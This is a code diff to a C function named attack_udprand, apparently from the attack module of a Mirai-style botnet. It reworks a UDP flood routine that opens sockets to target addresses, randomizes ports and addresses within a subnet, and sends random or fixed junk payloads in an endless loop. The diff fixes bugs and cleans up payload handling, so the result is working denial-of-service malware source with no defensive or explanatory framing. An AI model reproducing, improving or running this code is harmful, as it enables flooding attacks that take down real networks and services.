@@ -805,71 +805,73 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 
 void attack_udprand(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    int i;
-    char **pkts = calloc(targs_len, sizeof (char *));
-    int *fds = calloc(targs_len, sizeof (int));
-    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
-    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 999);
-    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
-    struct sockaddr_in bind_addr = {0};
-    if (sport == 0xffff)
-    {
-        sport = rand_next();
-    } else {
-        sport = htons(sport);
-    }
-    for(i = 0; i < targs_len; i++)
-    {
-        struct iphdr *iph;
-        struct udphdr *udph;
+	int i;
+	char **pkts = calloc(targs_len, sizeof (char *));
+	int *fds = calloc(targs_len, sizeof (int));
+	port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
+	port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+	uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
+	BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
+	struct sockaddr_in bind_addr = {0};
+	if (sport == 0xffff)
+	{
+		sport = rand_next();
+	} else {
+		sport = htons(sport);
+	}
+	for(i = 0; i < targs_len; i++)
+	{
+		struct iphdr *iph = NULL;
+		struct udphdr *udph = NULL;
+		if (dport == 0xffff)
+		{
+			targs[i].sock_addr.sin_port = rand_next();
+		} else {
+			targs[i].sock_addr.sin_port = htons(dport);
+		}
+		if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
+		{
+			#ifdef DEBUG
+			printf("Socket Failed To Start!\n");
+			#endif
+			return; 
+		}
+		bind_addr.sin_family = AF_INET;
+		bind_addr.sin_port = sport;
+		bind_addr.sin_addr.s_addr = 0;
+		if(bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
+		{
 
-        char *LAMP[] = {"\x00\x02\x00\x02SA\x00\x02SKK\x00\x02ASAAS\x00\x02OKK\x00\x02HG\x00\x02ssWQhJ\x00\x02HGJGJG\x00\x02\x00\x02\x00\x02\x00\x02HJGHJG\x00\x02HGJGJJHG\x00\x02\x00\x02JGJHGJHGFTASKL\x00\x02--W\x00\x02-WEWS@\x00\x02\x00\x02\x00\x02SADA@AWWQWQ\x00\x02\x00\x02\x00\x02"};
-        
-        char *data = LAMP[rand() % (sizeof(LAMP) / sizeof(char *))];
-        
-        pkts[i] = calloc(65535, sizeof (char));
-        if (dport == 0xffff)
-        {
-            targs[i].sock_addr.sin_port = rand_next();
-        } else {
-            targs[i].sock_addr.sin_port = htons(dport);
-        }
-            if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
-            {
-                #ifdef DEBUG
-                printf("Socket Failed To Start!\n");
-                #endif
-                return; 
-            }
-            bind_addr.sin_family = AF_INET;
-            bind_addr.sin_port = sport;
-            bind_addr.sin_addr.s_addr = 0;
-            if(bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
-            {
+		}
+		if (targs[i].netmask < 32)
+		{
+			targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
+		}
 
-            }
-        if (targs[i].netmask < 32)
-        {
-            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
-        }
+		if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
+		{
 
-        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
-        {
-
-        }
-     }
-        while (TRUE)
-        {
-         for (i = 0; i < targs_len; i++)
-             {
-                 char *data = pkts[i];
-                if (data_rand)
-                 rand_str(data, data_len);
-                send(fds[i], data, data_len, MSG_NOSIGNAL);
-            }
-        }
-    }
+		}
+	 }
+	char *data = NULL;
+	if (data_rand)
+	{
+		data = malloc(data_len+1);
+		rand_str(data, data_len);
+	}
+	else
+	{
+		data = ("\x00\x02\x00\x02SA\x00\x02SKK\x00\x02ASAAS\x00\x02OKK\x00\x02HG\x00\x02ssWQhJ\x00\x02HGJGJG\x00\x02\x00\x02\x00\x02\x00\x02HJGHJG\x00\x02HGJGJJHG\x00\x02\x00\x02JGJHGJHGFTASKL\x00\x02--W\x00\x02-WEWS@\x00\x02\x00\x02\x00\x02SADA@AWWQWQ\x00\x02\x00\x02\x00\x02");
+		data_len = 50;
+	}
+	while (TRUE)
+	{
+		for (i = 0; i < targs_len; i++)
+		{
+			send(fds[i], data, data_len, MSG_NOSIGNAL);
+		}
+	}
+}
     
 
 
